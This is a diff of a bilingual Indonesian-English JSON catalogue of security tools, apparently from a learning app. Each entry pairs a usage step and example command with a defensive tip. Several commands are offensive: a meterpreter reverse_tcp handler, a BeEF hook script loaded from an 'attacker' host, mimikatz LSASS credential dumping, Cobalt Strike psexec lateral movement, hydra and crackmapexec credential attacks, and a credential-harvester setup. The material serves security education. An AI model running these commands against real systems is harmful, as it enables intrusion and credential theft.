@@ -11,10 +11,7 @@
    "id": "Arahkan proxy browser ke 127.0.0.1:8080, buka tab Proxy → Intercept, lalu ubah nilai parameter yang lewat.",
    "en": "Point your browser's proxy to 127.0.0.1:8080, open Proxy → Intercept, then edit the parameter values passing through."
   },
-<<<<<<< HEAD
   "cmd": "burpsuite --proxy-port 8080 --intercept on",
-=======
->>>>>>> 139710653228b172a081280c0c37a037c1a953fb
   "tip": {
    "id": "Di dunia nyata, celah ini dicegah dengan validasi di sisi SERVER, bukan cuma mengandalkan JavaScript di browser.",
    "en": "In the real world this is prevented with SERVER-SIDE validation, not just trusting browser-side JavaScript."
@@ -33,10 +30,7 @@
    "id": "Masukkan URL target di kolom 'Automated Scan', klik Attack, lalu baca laporan Alerts.",
    "en": "Enter the target URL in 'Automated Scan', click Attack, then read the Alerts report."
   },
-<<<<<<< HEAD
   "cmd": "zap-cli quick-scan --self-contained -o /zap/wrk/report.html https://target.id",
-=======
->>>>>>> 139710653228b172a081280c0c37a037c1a953fb
   "tip": {
    "id": "Scan otomatis cuma menangkap pola yang sudah dikenal; selalu verifikasi manual sebelum melapor sebagai celah nyata.",
    "en": "Automated scans only catch known patterns; always verify manually before reporting a real finding."
@@ -55,10 +49,7 @@
    "id": "Jalankan di terminal diarahkan ke IP/domain target; hasilnya daftar port terbuka dan servis yang berjalan.",
    "en": "Run it in a terminal pointed at the target IP/domain; the output lists open ports and running services."
   },
-<<<<<<< HEAD
   "cmd": "nmap -sV -p- 192.168.1.10",
-=======
->>>>>>> 139710653228b172a081280c0c37a037c1a953fb
   "tip": {
    "id": "Admin server yang baik menutup port yang tidak dipakai (least privilege) alih-alih mengandalkan 'tidak ketahuan'.",
    "en": "A good admin closes unused ports (least privilege) instead of relying on 'security through obscurity'."
@@ -77,10 +68,7 @@
    "id": "Pilih antarmuka jaringan, klik Start, lalu filter paket dengan ekspresi seperti http.request.",
    "en": "Select a network interface, click Start, then filter packets with an expression like http.request."
   },
-<<<<<<< HEAD
   "cmd": "wireshark -i eth0 -f \"port 80\"",
-=======
->>>>>>> 139710653228b172a081280c0c37a037c1a953fb
   "tip": {
    "id": "Data sensitif yang lewat tanpa HTTPS bisa terbaca jelas lewat tool ini — itulah kenapa TLS wajib, bukan opsional.",
    "en": "Sensitive data sent without HTTPS is plainly readable with this tool — that's why TLS is mandatory, not optional."
@@ -99,10 +87,7 @@
    "id": "Arahkan ke host target; hasilnya daftar temuan seperti header hilang atau direktori sensitif terbuka.",
    "en": "Point it at the target host; the output lists findings like missing headers or exposed sensitive directories."
   },
-<<<<<<< HEAD
   "cmd": "nikto -h https://target.id -ssl",
-=======
->>>>>>> 139710653228b172a081280c0c37a037c1a953fb
   "tip": {
    "id": "Header keamanan (X-Frame-Options, CSP, dll.) murah untuk dipasang tapi sering terlewat di aplikasi nyata.",
    "en": "Security headers (X-Frame-Options, CSP, etc.) are cheap to add but often forgotten in real apps."
@@ -121,10 +106,7 @@
    "id": "Beri URL yang punya parameter dicurigai; tool mencoba berbagai payload untuk membuktikan celahnya.",
    "en": "Give it a URL with a suspected parameter; it tries various payloads to prove the vulnerability."
   },
-<<<<<<< HEAD
   "cmd": "sqlmap -u \"https://target.id/produk?id=1\" --dbs",
-=======
->>>>>>> 139710653228b172a081280c0c37a037c1a953fb
   "tip": {
    "id": "Prepared statements / parameterized query menutup celah ini total — jangan pernah menyambung string SQL mentah.",
    "en": "Prepared/parameterized statements close this gap entirely — never concatenate raw SQL strings."
@@ -143,10 +125,7 @@
    "id": "Beri URL target dan wordlist; tool mencoba tiap kata sebagai path dan melaporkan yang merespons.",
    "en": "Give it a target URL and a wordlist; it tries each word as a path and reports which ones respond."
   },
-<<<<<<< HEAD
   "cmd": "gobuster dir -u https://target.id -w wordlist.txt",
-=======
->>>>>>> 139710653228b172a081280c0c37a037c1a953fb
   "tip": {
    "id": "File backup (.bak, .old) atau folder admin yang 'disembunyikan' tetap bisa ditemukan — jangan andalkan itu sebagai proteksi.",
    "en": "'Hidden' backup files (.bak, .old) or admin folders can still be found — never rely on that as protection."
@@ -165,10 +144,7 @@
    "id": "Beri daftar user, daftar password, dan target servis (ssh, http-post-form, dll).",
    "en": "Give it a user list, a password list, and the target service (ssh, http-post-form, etc.)."
   },
-<<<<<<< HEAD
   "cmd": "hydra -l admin -P rockyou.txt ssh://192.168.1.10",
-=======
->>>>>>> 139710653228b172a081280c0c37a037c1a953fb
   "tip": {
    "id": "Rate limiting dan penguncian akun setelah beberapa percobaan gagal adalah pertahanan utama melawan ini.",
    "en": "Rate limiting and account lockout after a few failed attempts are the main defenses against this."
@@ -187,10 +163,7 @@
    "id": "Beri file berisi hash; tool mencoba kata-kata umum lalu kombinasi karakter sampai cocok.",
    "en": "Give it a file of hashes; it tries common words then character combinations until one matches."
   },
-<<<<<<< HEAD
   "cmd": "john --wordlist=rockyou.txt hashes.txt",
-=======
->>>>>>> 139710653228b172a081280c0c37a037c1a953fb
   "tip": {
    "id": "Hash lambat seperti Argon2id/bcrypt membuat serangan ini jauh lebih mahal dibanding MD5/SHA1 biasa.",
    "en": "Slow hashes like Argon2id/bcrypt make this attack far more expensive than plain MD5/SHA1."
@@ -209,10 +182,7 @@
    "id": "Tambahkan header, method, dan body sesuai kebutuhan pengujian endpoint target.",
    "en": "Add headers, method, and body as needed to test the target endpoint."
   },
-<<<<<<< HEAD
   "cmd": "curl -X POST -H \"Content-Type: application/json\" -d '{\"q\":1}' https://target.id/api",
-=======
->>>>>>> 139710653228b172a081280c0c37a037c1a953fb
   "tip": {
    "id": "Endpoint API yang tidak membatasi method (GET/POST/PUT/DELETE) bisa disalahgunakan — validasi method di server.",
    "en": "An API endpoint that doesn't restrict methods (GET/POST/PUT/DELETE) can be abused — validate the method server-side."
@@ -231,10 +201,7 @@
    "id": "Tekan F12, buka tab Network untuk melihat request, atau tab Console untuk menjalankan JavaScript.",
    "en": "Press F12, open the Network tab to see requests, or the Console tab to run JavaScript."
   },
-<<<<<<< HEAD
   "cmd": "// Console: fetch('/api/me').then(r=>r.json()).then(console.log)",
-=======
->>>>>>> 139710653228b172a081280c0c37a037c1a953fb
   "tip": {
    "id": "Validasi harga/role HANYA di client (disabled di tombol, hidden input) bisa dilewati lewat Console dalam hitungan detik.",
    "en": "Validating price/role ONLY on the client (disabled buttons, hidden inputs) can be bypassed via the Console in seconds."
@@ -253,10 +220,7 @@
    "id": "Buat koleksi request, atur header Authorization, lalu kirim dan bandingkan responsnya.",
    "en": "Create a request collection, set the Authorization header, then send and compare responses."
   },
-<<<<<<< HEAD
   "cmd": "// Header: Authorization: Bearer <token>",
-=======
->>>>>>> 139710653228b172a081280c0c37a037c1a953fb
   "tip": {
    "id": "Token yang tidak kedaluwarsa (no expiry) adalah risiko besar jika pernah bocor sekali saja.",
    "en": "A token that never expires is a huge risk if it leaks even once."
@@ -275,10 +239,7 @@
    "id": "Tulis method dan URL, lalu field data langsung sebagai key=value tanpa perlu JSON manual.",
    "en": "Write the method and URL, then data fields directly as key=value without manual JSON."
   },
-<<<<<<< HEAD
   "cmd": "http POST target.id/api/login username=admin password=admin123",
-=======
->>>>>>> 139710653228b172a081280c0c37a037c1a953fb
   "tip": {
    "id": "Mencoba kredensial default (admin/admin123) adalah langkah pertama penyerang — selalu paksa ganti password awal.",
    "en": "Trying default credentials (admin/admin123) is an attacker's first move — always force an initial password change."
@@ -297,10 +258,7 @@
    "id": "Arahkan ke URL WordPress target dengan API token untuk mencocokkan versi dengan basis data celah.",
    "en": "Point it at the target WordPress URL with an API token to match versions against a vulnerability database."
   },
-<<<<<<< HEAD
   "cmd": "wpscan --url https://target.id --enumerate vp",
-=======
->>>>>>> 139710653228b172a081280c0c37a037c1a953fb
   "tip": {
    "id": "Plugin/tema yang jarang diperbarui adalah penyebab terbesar situs WordPress diretas — rutinkan update.",
    "en": "Rarely-updated plugins/themes are the biggest cause of hacked WordPress sites — keep them updated."
@@ -319,10 +277,7 @@
    "id": "Cari modul exploit yang cocok, set opsi RHOSTS/payload, lalu jalankan untuk mendapat akses.",
    "en": "Find a matching exploit module, set RHOSTS/payload options, then run it to gain access."
   },
-<<<<<<< HEAD
   "cmd": "use exploit/multi/handler\nset payload windows/meterpreter/reverse_tcp\nexploit",
-=======
->>>>>>> 139710653228b172a081280c0c37a037c1a953fb
   "tip": {
    "id": "Sistem yang rutin di-patch menutup celah sebelum exploit publik sempat dipakai menyerangnya.",
    "en": "Regularly patched systems close the hole before a public exploit can be used against them."
@@ -341,10 +296,7 @@
    "id": "Deploy beacon ke host korban, lalu kendalikan lewat Team Server untuk gerak lateral di jaringan.",
    "en": "Deploy a beacon to the victim host, then control it via the Team Server to move laterally in the network."
   },
-<<<<<<< HEAD
   "cmd": "beacon> jump psexec64 TARGET-PC smb",
-=======
->>>>>>> 139710653228b172a081280c0c37a037c1a953fb
   "tip": {
    "id": "Segmentasi jaringan membatasi seberapa jauh penyerang bisa 'lompat' walau satu host sudah dikuasai.",
    "en": "Network segmentation limits how far an attacker can move even after one host is compromised."
@@ -363,10 +315,7 @@
    "id": "Suntikkan hook.js ke halaman rentan XSS, lalu kendalikan browser korban dari panel BeEF.",
    "en": "Inject hook.js into an XSS-vulnerable page, then control the victim's browser from the BeEF panel."
   },
-<<<<<<< HEAD
   "cmd": "<script src=\"http://attacker/hook.js\"></script>",
-=======
->>>>>>> 139710653228b172a081280c0c37a037c1a953fb
   "tip": {
    "id": "Content Security Policy (CSP) yang ketat mencegah script asing seperti ini dimuat sama sekali.",
    "en": "A strict Content Security Policy (CSP) prevents a foreign script like this from loading at all."
@@ -385,10 +334,7 @@
    "id": "Tangkap handshake 4-way saat perangkat terhubung, lalu crack dengan wordlist lewat aircrack-ng.",
    "en": "Capture the 4-way handshake when a device connects, then crack it with a wordlist via aircrack-ng."
   },
-<<<<<<< HEAD
   "cmd": "aircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF capture.cap",
-=======
->>>>>>> 139710653228b172a081280c0c37a037c1a953fb
   "tip": {
    "id": "Passphrase WiFi yang panjang dan acak membuat serangan kamus seperti ini praktis tidak berguna.",
    "en": "A long, random WiFi passphrase makes this dictionary attack practically useless."
@@ -407,10 +353,7 @@
    "id": "Pilih mode hash yang sesuai (-m), lalu jalankan serangan kamus atau mask terhadap filenya.",
    "en": "Pick the matching hash mode (-m), then run a dictionary or mask attack against the file."
   },
-<<<<<<< HEAD
   "cmd": "hashcat -m 0 -a 0 hashes.txt rockyou.txt",
-=======
->>>>>>> 139710653228b172a081280c0c37a037c1a953fb
   "tip": {
    "id": "Menambahkan 'salt' unik tiap password mencegah tabel pre-computed dipakai menyerang banyak akun sekaligus.",
    "en": "Adding a unique per-password 'salt' stops a precomputed table from attacking many accounts at once."
@@ -429,10 +372,7 @@
    "id": "Jalankan dengan privilege admin, lalu gunakan modul sekurlsa untuk membaca kredensial dari LSASS.",
    "en": "Run it with admin privilege, then use the sekurlsa module to read credentials from LSASS."
   },
-<<<<<<< HEAD
   "cmd": "mimikatz # sekurlsa::logonpasswords",
-=======
->>>>>>> 139710653228b172a081280c0c37a037c1a953fb
   "tip": {
    "id": "Credential Guard dan membatasi akun admin domain di workstation biasa menutup banyak jalur tool ini.",
    "en": "Credential Guard and keeping domain admin accounts off regular workstations close most of this tool's paths."
@@ -451,10 +391,7 @@
    "id": "Jalankan di antarmuka jaringan lokal; tool menunggu permintaan resolusi nama yang salah ketik lalu menjebaknya.",
    "en": "Run it on the local network interface; it waits for mistyped name-resolution requests and traps them."
   },
-<<<<<<< HEAD
   "cmd": "responder -I eth0 -wrf",
-=======
->>>>>>> 139710653228b172a081280c0c37a037c1a953fb
   "tip": {
    "id": "Menonaktifkan LLMNR/NBT-NS di kebijakan grup Windows menutup celah peracunan nama ini.",
    "en": "Disabling LLMNR/NBT-NS via Windows Group Policy closes this name-poisoning hole."
@@ -473,10 +410,7 @@
    "id": "Beri rentang IP dan kredensial; tool mengecek mana yang valid di tiap host secara paralel.",
    "en": "Give it an IP range and credentials; it checks which are valid on each host in parallel."
   },
-<<<<<<< HEAD
   "cmd": "crackmapexec smb 10.0.0.0/24 -u admin -p 'Passw0rd!'",
-=======
->>>>>>> 139710653228b172a081280c0c37a037c1a953fb
   "tip": {
    "id": "Prinsip 'satu password per sistem' mencegah satu kredensial bocor membuka seluruh jaringan.",
    "en": "A 'one password per system' policy stops a single leaked credential from unlocking the whole network."
@@ -495,10 +429,7 @@
    "id": "Buat policy scan, arahkan ke rentang IP target, lalu baca laporan tingkat keparahan tiap temuan.",
    "en": "Create a scan policy, point it at the target IP range, then read the severity report for each finding."
   },
-<<<<<<< HEAD
   "cmd": "nessuscli scan --policy \"Basic Network Scan\" --targets 10.0.0.0/24",
-=======
->>>>>>> 139710653228b172a081280c0c37a037c1a953fb
   "tip": {
    "id": "Scan kerentanan rutin (bukan sekali saja) penting karena CVE baru muncul setiap hari.",
    "en": "Routine (not one-off) vulnerability scans matter because new CVEs appear daily."
@@ -517,10 +448,7 @@
    "id": "Daftarkan target di Greenbone, pilih task scan, lalu tinjau laporan hasil pemindaian.",
    "en": "Register the target in Greenbone, select a scan task, then review the scan report."
   },
-<<<<<<< HEAD
   "cmd": "gvm-cli --gmp-username admin socket --xml \"<get_tasks/>\"",
-=======
->>>>>>> 139710653228b172a081280c0c37a037c1a953fb
   "tip": {
    "id": "Alat gratis sekalipun bisa seefektif komersial kalau basis data kerentanannya rutin diperbarui.",
    "en": "Even free tools can be as effective as commercial ones if the vulnerability database is kept current."
@@ -539,10 +467,7 @@
    "id": "Cari dengan query seperti 'port:22 product:OpenSSH' untuk menemukan perangkat sesuai kriteria.",
    "en": "Search with a query like 'port:22 product:OpenSSH' to find devices matching the criteria."
   },
-<<<<<<< HEAD
   "cmd": "shodan search \"default password\" port:23",
-=======
->>>>>>> 139710653228b172a081280c0c37a037c1a953fb
   "tip": {
    "id": "Jangan pernah mengekspos panel admin atau IoT ke internet publik tanpa autentikasi kuat — Shodan akan menemukannya.",
    "en": "Never expose an admin panel or IoT device to the public internet without strong auth — Shodan will find it."
@@ -561,10 +486,7 @@
    "id": "Masukkan entitas awal (mis. domain), jalankan 'transform' untuk menemukan entitas terkait secara otomatis.",
    "en": "Enter a starting entity (e.g. a domain), run a 'transform' to automatically discover related entities."
   },
-<<<<<<< HEAD
   "cmd": "// Transform: Domain → DNS → IP → Netblock",
-=======
->>>>>>> 139710653228b172a081280c0c37a037c1a953fb
   "tip": {
    "id": "Informasi yang kelihatan remeh (nama pegawai di LinkedIn) sering jadi titik awal serangan phishing bertarget.",
    "en": "Seemingly trivial info (an employee's name on LinkedIn) often becomes the starting point of a targeted phishing attack."
@@ -583,10 +505,7 @@
    "id": "Pilih menu 'Website Attack Vectors' → 'Credential Harvester' lalu masukkan URL yang mau dikloning.",
    "en": "Choose 'Website Attack Vectors' → 'Credential Harvester', then enter the URL to clone."
   },
-<<<<<<< HEAD
   "cmd": "setoolkit  # 1) Social-Engineering Attacks  2) Website Attack Vectors",
-=======
->>>>>>> 139710653228b172a081280c0c37a037c1a953fb
   "tip": {
    "id": "Pelatihan kesadaran keamanan rutin untuk pegawai adalah pertahanan paling efektif melawan phishing.",
    "en": "Regular security-awareness training for employees is the most effective defense against phishing."
@@ -605,10 +524,7 @@
    "id": "Buat listener, hasilkan stager untuk korban, lalu kendalikan agent yang terhubung.",
    "en": "Create a listener, generate a stager for the victim, then control the connected agent."
   },
-<<<<<<< HEAD
   "cmd": "(Empire) > listeners\n(Empire: listeners) > execute",
-=======
->>>>>>> 139710653228b172a081280c0c37a037c1a953fb
   "tip": {
    "id": "EDR (Endpoint Detection & Response) modern dirancang khusus mendeteksi pola agent C2 seperti ini.",
    "en": "Modern EDR (Endpoint Detection & Response) is specifically built to detect C2 agent patterns like this."
@@ -627,10 +543,7 @@
    "id": "Buka file binary, telusuri fungsi lewat Graph View, lalu beri nama ulang variabel agar mudah dibaca.",
    "en": "Open the binary, navigate functions via Graph View, then rename variables to make it readable."
   },
-<<<<<<< HEAD
   "cmd": "File > Open > target.bin  // lalu tekan F5 untuk Hex-Rays decompiler",
-=======
->>>>>>> 139710653228b172a081280c0c37a037c1a953fb
   "tip": {
    "id": "Obfuscation memperlambat reverse engineering tapi tidak mencegahnya total — jangan jadikan itu satu-satunya proteksi.",
    "en": "Obfuscation slows reverse engineering but never fully prevents it — don't make it your only protection."
@@ -649,10 +562,7 @@
    "id": "Buat proyek, import binary, jalankan auto-analysis, lalu baca hasil dekompilasi fungsi targetnya.",
    "en": "Create a project, import the binary, run auto-analysis, then read the decompiled target function."
   },
-<<<<<<< HEAD
   "cmd": "analyzeHeadless /project ghidra_proj -import target.bin -postScript Analyze.java",
-=======
->>>>>>> 139710653228b172a081280c0c37a037c1a953fb
   "tip": {
    "id": "Kode yang sudah dikompilasi tetap bisa dibaca logikanya — jangan taruh secret (API key) di dalam binary.",
    "en": "Compiled code's logic can still be read — never embed a secret (API key) inside a binary."
@@ -671,10 +581,7 @@
    "id": "Buka binary dengan flag analisis, lalu gunakan perintah seperti pdf untuk melihat disassembly fungsi.",
    "en": "Open the binary with the analysis flag, then use commands like pdf to view a function's disassembly."
   },
-<<<<<<< HEAD
   "cmd": "r2 -A target.bin\n[0x00001040]> pdf @main",
-=======
->>>>>>> 139710653228b172a081280c0c37a037c1a953fb
   "tip": {
    "id": "Tool command-line yang skriptable seperti ini memudahkan otomasi analisis malware dalam jumlah besar.",
    "en": "A scriptable CLI tool like this makes automating large-scale malware analysis much easier."
@@ -693,10 +600,7 @@
    "id": "Gunakan p32/p64 untuk membungkus alamat, lalu kirim payload ke proses lewat process() atau remote().",
    "en": "Use p32/p64 to pack addresses, then send the payload to the process via process() or remote()."
   },
-<<<<<<< HEAD
   "cmd": "from pwn import *\npayload = b'A'*72 + p64(0xdeadbeef)",
-=======
->>>>>>> 139710653228b172a081280c0c37a037c1a953fb
   "tip": {
    "id": "Stack canary dan ASLR dirancang khusus untuk membuat payload buffer overflow seperti ini jauh lebih sulit berhasil.",
    "en": "Stack canaries and ASLR are specifically designed to make buffer-overflow payloads like this far harder to succeed."
@@ -715,10 +619,7 @@
    "id": "Muat binary, set breakpoint di fungsi rentan, lalu periksa register dan stack saat crash terjadi.",
    "en": "Load the binary, set a breakpoint at the vulnerable function, then inspect registers and the stack when it crashes."
   },
-<<<<<<< HEAD
   "cmd": "gdb ./target\ngef> checksec",
-=======
->>>>>>> 139710653228b172a081280c0c37a037c1a953fb
   "tip": {
    "id": "Proteksi biner seperti NX, PIE, dan Canary semuanya bisa diperiksa satu perintah ini sebelum mencari celah.",
    "en": "Binary protections like NX, PIE, and Canary can all be checked with this one command before hunting for a flaw."
@@ -737,10 +638,7 @@
    "id": "Kompilasi program dengan afl-cc, siapkan input awal, lalu jalankan fuzzer dan pantau crash yang ditemukan.",
    "en": "Compile the program with afl-cc, seed it with initial input, then run the fuzzer and watch for crashes found."
   },
-<<<<<<< HEAD
   "cmd": "afl-fuzz -i seeds/ -o findings/ -- ./target @@",
-=======
->>>>>>> 139710653228b172a081280c0c37a037c1a953fb
   "tip": {
    "id": "Fuzzing rutin di CI/CD menemukan crash sebelum rilis, jauh lebih murah daripada ditemukan penyerang di produksi.",
    "en": "Routine fuzzing in CI/CD finds crashes before release — far cheaper than an attacker finding them in production."
@@ -759,10 +657,7 @@
    "id": "Tulis skrip JavaScript yang meng-hook fungsi target, lalu lampirkan ke proses yang sedang berjalan.",
    "en": "Write a JavaScript script that hooks the target function, then attach it to the running process."
   },
-<<<<<<< HEAD
   "cmd": "frida -U -f com.target.app -l hook.js",
-=======
->>>>>>> 139710653228b172a081280c0c37a037c1a953fb
   "tip": {
    "id": "Pemeriksaan integritas (root/jailbreak detection) yang kuat mempersulit instrumentasi runtime seperti ini di aplikasi mobile.",
    "en": "Strong integrity checks (root/jailbreak detection) make runtime instrumentation like this much harder on mobile apps."
@@ -781,10 +676,7 @@
    "id": "Identifikasi profil OS dari dump, lalu jalankan plugin seperti pslist atau netscan untuk menelusuri aktivitas.",
    "en": "Identify the OS profile from the dump, then run plugins like pslist or netscan to trace activity."
   },
-<<<<<<< HEAD
   "cmd": "volatility -f memdump.raw --profile=Win10x64 pslist",
-=======
->>>>>>> 139710653228b172a081280c0c37a037c1a953fb
   "tip": {
    "id": "Malware fileless hanya hidup di RAM — forensik memori sering jadi satu-satunya cara mendeteksinya.",
    "en": "Fileless malware lives only in RAM — memory forensics is often the only way to detect it."
@@ -803,10 +695,7 @@
    "id": "Tulis rule berisi pola yang dicari, lalu jalankan terhadap file atau direktori untuk mencari kecocokan.",
    "en": "Write a rule containing the pattern to search for, then run it against a file or directory for matches."
   },
-<<<<<<< HEAD
   "cmd": "yara -r malware_rules.yar /samples/",
-=======
->>>>>>> 139710653228b172a081280c0c37a037c1a953fb
   "tip": {
    "id": "Tim blue team memakai rule ini untuk mendeteksi varian baru malware yang mirip sampel lama.",
    "en": "Blue teams use these rules to detect new malware variants that resemble older known samples."
@@ -825,10 +714,7 @@
    "id": "Kumpulkan data dengan SharpHound, lalu impor ke BloodHound dan jalankan query 'Shortest Path'.",
    "en": "Collect data with SharpHound, import it into BloodHound, then run a 'Shortest Path' query."
   },
-<<<<<<< HEAD
   "cmd": "SharpHound.exe -c All\n// lalu import ke neo4j BloodHound",
-=======
->>>>>>> 139710653228b172a081280c0c37a037c1a953fb
   "tip": {
    "id": "Audit izin AD secara berkala menutup jalur eskalasi tak terduga sebelum penyerang menemukannya lebih dulu.",
    "en": "Periodic AD permission audits close unexpected escalation paths before an attacker finds them first."
@@ -847,10 +733,7 @@
    "id": "Buat Listener HTTP, hasilkan Launcher sebagai stager, lalu kendalikan Grunt yang terhubung.",
    "en": "Create an HTTP Listener, generate a Launcher stager, then control the connected Grunt."
   },
-<<<<<<< HEAD
   "cmd": "> Create Listener HTTP\n> Generate Launcher PowerShell",
-=======
->>>>>>> 139710653228b172a081280c0c37a037c1a953fb
   "tip": {
    "id": "Application allowlisting membatasi binary/script asing yang boleh berjalan, menutup banyak teknik stager seperti ini.",
    "en": "Application allowlisting restricts which foreign binaries/scripts may run, closing off many stager techniques like this."
@@ -869,10 +752,7 @@
    "id": "Sisipkan subdomain unik Collaborator ke parameter yang dicurigai, lalu tunggu interaksi DNS/HTTP masuk.",
    "en": "Insert a unique Collaborator subdomain into the suspected parameter, then wait for incoming DNS/HTTP interactions."
   },
-<<<<<<< HEAD
   "cmd": "payload: http://abc123.oastify.com/ssrf-test",
-=======
->>>>>>> 139710653228b172a081280c0c37a037c1a953fb
   "tip": {
    "id": "Celah SSRF/blind injection sering tidak terlihat dari respons biasa — pemantauan koneksi keluar server itu penting.",
    "en": "SSRF/blind injection flaws are often invisible in normal responses — monitoring a server's outbound connections matters."
@@ -891,10 +771,7 @@
    "id": "Jalankan terhadap repo dengan ruleset keamanan; hasilnya daftar baris kode yang perlu ditinjau.",
    "en": "Run it against a repo with a security ruleset; it outputs a list of code lines to review."
   },
-<<<<<<< HEAD
   "cmd": "semgrep --config p/owasp-top-ten src/",
-=======
->>>>>>> 139710653228b172a081280c0c37a037c1a953fb
   "tip": {
    "id": "Menjalankan SAST di setiap pull request menangkap celah sebelum kode sempat sampai ke produksi.",
    "en": "Running SAST on every pull request catches flaws before the code ever reaches production."
@@ -913,10 +790,7 @@
    "id": "Muat ruleset (mis. ET Open), jalankan di antarmuka jaringan, lalu pantau log alert yang dihasilkan.",
    "en": "Load a ruleset (e.g. ET Open), run it on a network interface, then monitor the generated alert log."
   },
-<<<<<<< HEAD
   "cmd": "suricata -c suricata.yaml -i eth0",
-=======
->>>>>>> 139710653228b172a081280c0c37a037c1a953fb
   "tip": {
    "id": "IDS mendeteksi tapi tidak selalu memblokir — pasangkan dengan IPS/firewall untuk respons otomatis.",
    "en": "An IDS detects but doesn't always block — pair it with an IPS/firewall for automatic response."
@@ -935,10 +809,7 @@
    "id": "Pilih level (1-3) sesuai risiko aplikasi, lalu jadikan daftar kontrolnya acuan arsitektur keamanan sejak desain.",
    "en": "Pick a level (1-3) matching the app's risk, then use its control list as the security architecture reference from the design stage."
   },
-<<<<<<< HEAD
   "cmd": "// ASVS V2: Authentication  V4: Access Control  V5: Validation",
-=======
->>>>>>> 139710653228b172a081280c0c37a037c1a953fb
   "tip": {
    "id": "Merancang keamanan sejak hari pertama (secure by design) jauh lebih murah daripada menambalnya setelah insiden.",
    "en": "Designing security from day one (secure by design) is far cheaper than patching it after an incident."
@@ -957,10 +828,7 @@
    "id": "Jadikan checklist wajib saat code review dan desain arsitektur: tiap item dicek apakah sudah dimitigasi.",
    "en": "Use it as a mandatory checklist during code review and architecture design, verifying each item is mitigated."
   },
-<<<<<<< HEAD
   "cmd": "// A01 Broken Access Control  A02 Cryptographic Failures  A03 Injection",
-=======
->>>>>>> 139710653228b172a081280c0c37a037c1a953fb
   "tip": {
    "id": "Broken Access Control konsisten jadi risiko #1 — selalu verifikasi otorisasi di SETIAP endpoint, bukan cuma login.",
    "en": "Broken Access Control consistently ranks #1 — always verify authorization on EVERY endpoint, not just at login."
@@ -979,10 +847,7 @@
    "id": "Tambahkan header ini di respons server dengan whitelist domain tepercaya untuk tiap jenis resource.",
    "en": "Add this header to the server response with a whitelist of trusted domains for each resource type."
   },
-<<<<<<< HEAD
   "cmd": "Content-Security-Policy: default-src 'self'; script-src 'self' trusted.cdn.com",
-=======
->>>>>>> 139710653228b172a081280c0c37a037c1a953fb
   "tip": {
    "id": "CSP yang benar adalah pertahanan berlapis terkuat melawan XSS, bahkan jika ada celah injeksi lolos.",
    "en": "A properly set CSP is one of the strongest layered defenses against XSS, even if an injection flaw slips through."
@@ -1001,10 +866,7 @@
    "id": "Gunakan Authorization Code flow dengan PKCE untuk aplikasi web/mobile, jangan Implicit flow yang sudah usang.",
    "en": "Use the Authorization Code flow with PKCE for web/mobile apps, not the deprecated Implicit flow."
   },
-<<<<<<< HEAD
   "cmd": "GET /authorize?response_type=code&client_id=app&code_challenge=xyz",
-=======
->>>>>>> 139710653228b172a081280c0c37a037c1a953fb
   "tip": {
    "id": "PKCE mencegah pencurian authorization code di aplikasi mobile/SPA yang tidak bisa menyimpan client secret dengan aman.",
    "en": "PKCE prevents authorization-code theft in mobile/SPA apps that can't safely store a client secret."
@@ -1023,10 +885,7 @@
    "id": "Server menandatangani token dengan secret/private key; selalu verifikasi tanda tangan sebelum memercayai isinya.",
    "en": "The server signs the token with a secret/private key; always verify the signature before trusting its contents."
   },
-<<<<<<< HEAD
   "cmd": "jwt.verify(token, secret, { algorithms: ['HS256'] })",
-=======
->>>>>>> 139710653228b172a081280c0c37a037c1a953fb
   "tip": {
    "id": "Jangan pernah menerima alg:'none' dari token yang masuk — itu celah klasik yang memalsukan tanda tangan.",
    "en": "Never accept alg:'none' from an incoming token — it's a classic flaw that forges the signature."
@@ -1045,10 +904,7 @@
    "id": "Tambahkan header ini di respons HTTPS dengan max-age cukup panjang agar perlindungan bertahan lama.",
    "en": "Add this header to the HTTPS response with a sufficiently long max-age so the protection persists."
   },
-<<<<<<< HEAD
   "cmd": "Strict-Transport-Security: max-age=63072000; includeSubDomains",
-=======
->>>>>>> 139710653228b172a081280c0c37a037c1a953fb
   "tip": {
    "id": "Tanpa HSTS, serangan downgrade bisa memaksa korban kembali ke HTTP yang tidak terenkripsi.",
    "en": "Without HSTS, a downgrade attack can force a victim back onto unencrypted HTTP."
@@ -1067,10 +923,7 @@
    "id": "Pasang di depan aplikasi (mis. Cloudflare/ModSecurity), aktifkan ruleset OWASP Core Rule Set, lalu pantau false positive.",
    "en": "Deploy it in front of the app (e.g. Cloudflare/ModSecurity), enable the OWASP Core Rule Set, then monitor false positives."
   },
-<<<<<<< HEAD
   "cmd": "SecRule ARGS \"@detectSQLi\" \"id:1001,deny,status:403\"",
-=======
->>>>>>> 139710653228b172a081280c0c37a037c1a953fb
   "tip": {
    "id": "WAF adalah lapisan tambahan, bukan pengganti validasi input yang benar di kode aplikasinya sendiri.",
    "en": "A WAF is an extra layer, not a replacement for proper input validation in the application code itself."
@@ -1089,10 +942,7 @@
    "id": "Kirim log dari semua servis ke SIEM, buat aturan korelasi (mis. 5x login gagal), lalu atur alert otomatis.",
    "en": "Forward logs from every service into the SIEM, write correlation rules (e.g. 5 failed logins), then set automatic alerts."
   },
-<<<<<<< HEAD
   "cmd": "index=auth action=failure | stats count by user | where count > 5",
-=======
->>>>>>> 139710653228b172a081280c0c37a037c1a953fb
   "tip": {
    "id": "Tanpa logging terpusat, sebuah insiden bisa terjadi berbulan-bulan tanpa pernah terdeteksi oleh siapa pun.",
    "en": "Without centralized logging, an incident can go undetected by anyone for months."
@@ -1111,10 +961,7 @@
    "id": "Verifikasi identitas dan izin di SETIAP request (bukan cuma gerbang masuk), lakukan segmentasi mikro di jaringan.",
    "en": "Verify identity and authorization on EVERY request (not just at the gate), and micro-segment the network."
   },
-<<<<<<< HEAD
   "cmd": "// Prinsip: \"never trust, always verify\" di setiap permintaan",
-=======
->>>>>>> 139710653228b172a081280c0c37a037c1a953fb
   "tip": {
    "id": "Begitu penyerang masuk satu titik di jaringan tradisional, mereka sering bebas bergerak — Zero Trust menutup itu.",
    "en": "Once an attacker breaches one point in a traditional network they often roam freely — Zero Trust closes that gap."
@@ -1133,10 +980,7 @@
    "id": "Set parameter memory cost, time cost, dan paralelisme sesuai rekomendasi OWASP sebelum menyimpan hash.",
    "en": "Set the memory cost, time cost, and parallelism parameters per OWASP recommendations before storing the hash."
   },
-<<<<<<< HEAD
   "cmd": "argon2.hash(password, { type: argon2id, memoryCost: 19456 })",
-=======
->>>>>>> 139710653228b172a081280c0c37a037c1a953fb
   "tip": {
